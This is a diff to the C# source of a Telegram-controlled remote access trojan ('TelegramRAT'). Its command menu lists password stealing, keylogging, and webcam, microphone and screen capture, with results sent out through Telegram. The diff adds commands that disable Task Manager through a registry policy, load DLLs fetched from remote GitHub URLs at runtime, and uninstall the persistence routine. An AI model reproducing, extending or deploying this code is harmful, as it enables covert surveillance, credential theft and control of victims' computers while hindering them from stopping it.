@@ -9,10 +9,11 @@ using System.Runtime.InteropServices;
 using System.Speech.Synthesis;
 using System.Windows.Forms;
 using SimpleJSON;
+using Microsoft.Win32;
 
 namespace TelegramRAT
 {
-    class commands
+    internal sealed class commands
     {
         // Import dll'ls
         [DllImport("winmm.dll", EntryPoint = "mciSendString")]
@@ -34,16 +35,16 @@ namespace TelegramRAT
         [DllImport("iphlpapi.dll", ExactSpelling = true)]
         public static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);
 
-       
-
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern int SendMessage(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam);
+
+        
 
 
         // Commands handler
         public static void handle(string command)
         {
-            Console.WriteLine("Handling command " + command);
+            Console.WriteLine("[~] Handling command " + command);
             string[] args = command.Split(' ');
             args[0] = args[0].Remove(0, 1).ToUpper();
 
@@ -75,6 +76,12 @@ namespace TelegramRAT
                             "\n /ProcessList" +
                             "\n /ProcessKill <process>" +
                             "\n /ProcessStart <process>" +
+                            "\n" +
+                            "\n /TaskManagerDisable" +
+                            "\n /TaskManagerEnable" +
+                            "\n" +
+                            "\n /MinimizeAllWindows" +
+                            "\n /MaximizeAllWindows" +
                             "\n" +
                             "\n💳 STEALER:" +
                             "\n /GetPasswords" +
@@ -108,6 +115,10 @@ namespace TelegramRAT
                             "\n /SendKeyPress <keys>" +
                             "\n /NetDiscover <to>" +
                             "\n /Uninstall" +
+                            "\n" +
+                            "\n🔊 AUDIO: " +
+                            "\n /AudioVolumeSet <0-100>" +
+                            "\n /AudioVolumeGet" +
                             "\n" +
                             "\n💣 EVIL:" +
                             "\n /SetWallpaper <file>" +
@@ -239,7 +250,6 @@ namespace TelegramRAT
                                 "");
                             break;
                         }
-                        Console.WriteLine(response);
                         break;
                     }
                 // Whois
@@ -322,14 +332,8 @@ namespace TelegramRAT
                         }
                         // Send
                         telegram.sendImage(filename);
-                        // Delete photo (костыль)
-                        while (true)
-                        {
-                            try { File.Delete(filename); }
-                            catch (IOException)
-                            { continue; }
-                            break;
-                        }
+                        // Delete photo
+                        File.Delete(filename);
                         break;
                     }
                 // Microphone <seconds>
@@ -388,14 +392,8 @@ namespace TelegramRAT
                         }
                         // Send
                         telegram.sendVoice(filename);
-                        // Delete recording (костыль)
-                        while (true)
-                        {
-                            try { File.Delete(filename); }
-                            catch (IOException)
-                            { continue; }
-                            break;
-                        }
+                        // Delete recording
+                        File.Delete(filename);
                         break;
                     }
                 // Desktop
@@ -407,14 +405,8 @@ namespace TelegramRAT
                         gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                         bmpScreenshot.Save(filename, System.Drawing.Imaging.ImageFormat.Png);
                         telegram.sendImage(filename);
-                        // Delete photo (костыль)
-                        while (true)
-                        {
-                            try { File.Delete(filename); }
-                            catch (IOException)
-                            { continue; }
-                            break;
-                        }
+                        // Delete photo
+                        File.Delete(filename);
                         break;
                     }
                 // Keylogger
@@ -532,7 +524,52 @@ namespace TelegramRAT
                         telegram.sendText("📊 Processes with name " + processName + " started");
                         break;
                     }
-
+                // TaskManagerEnable
+                case "TASKMANAGERENABLE":
+                    {
+                        try
+                        {
+                            RegistryKey RegKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+                            RegKey.SetValue("DisableTaskMgr", 0);
+                            RegKey.Close();
+                        } catch
+                        {
+                            telegram.sendText("⛔ Something was wrong while enabling taskmanager");
+                            break;
+                        }
+                        telegram.sendText("✅ Taskmanager enabled");
+                        break;
+                    }
+                // TaskManagerEnable
+                case "TASKMANAGERDISABLE":
+                    {
+                        try
+                        {
+                            RegistryKey RegKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
+                            RegKey.SetValue("DisableTaskMgr", 1);
+                            RegKey.Close();
+                        } catch
+                        {
+                            telegram.sendText("⛔ Something was wrong while disabling taskmanager");
+                            break;
+                        }
+                    telegram.sendText("❎ Taskmanager disabled");
+                    break;
+                    }
+                // MinimizeAllWindows
+                case "MINIMIZEALLWINDOWS":
+                    {
+                        utils.MinimizeAllWindows();
+                        telegram.sendText("🎴 All windows minimized");
+                        break;
+                    }
+                // MaximizeAllWindows
+                case "MAXIMIZEALLWINDOWS":
+                    {
+                        utils.MaximizeAllWindows();
+                        telegram.sendText("🎴 All windows maximized");
+                        break;
+                    }
 
 
                 // GetPasswords
@@ -1132,8 +1169,7 @@ namespace TelegramRAT
                 case "UNINSTALL":
                     {
                         telegram.sendText("💉 Uninstalling malware from autorun...");
-                        persistence.unprotectProcess();
-                        persistence.delAutorun();
+                        persistence.uninstallSelf();
                         Thread.Sleep(2000);
                         Environment.Exit(0);
                         break;
@@ -1212,7 +1248,42 @@ namespace TelegramRAT
                         utils.PowerCommand("/l");
                         break;
                     }
-                
+
+                // AudioVolumeSet
+                case "AUDIOVOLUMESET":
+                    {
+                        // Check if args exists
+                        int volume;
+                        try
+                        {
+                            volume = int.Parse(args[1]);
+                        }
+                        catch (IndexOutOfRangeException)
+                        {
+                            telegram.sendText("⛔ Argument <volume> (from 0 to 100) is required for /AudioVolumeSet");
+                            break;
+                        }
+                        // Load dll'ls
+                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.3.0.0/lib/net40/AudioSwitcher.AudioApi.dll");
+                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.CoreAudio.3.0.0.1/lib/net40/AudioSwitcher.AudioApi.CoreAudio.dll");
+                        // Set
+                        utils.AudioVolumeSet(volume);
+                        // Response
+                        telegram.sendText("🔊 Audio volume set to " + volume + "%");
+                        break;
+                    }
+                // AudioVolumeGet
+                case "AUDIOVOLUMEGET":
+                    {
+                        // Load dll'ls
+                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.3.0.0/lib/net40/AudioSwitcher.AudioApi.dll");
+                        core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Inferno/master/Inferno/packages/AudioSwitcher.AudioApi.CoreAudio.3.0.0.1/lib/net40/AudioSwitcher.AudioApi.CoreAudio.dll");
+                        // Get
+                        double volume = utils.AudioVolumeGet();
+                        // Response
+                        telegram.sendText("🔊 Audio volume is " + volume + "%");
+                        break;
+                    }
 
                 // SetWallpaper <image>
                 case "SETWALLPAPER":
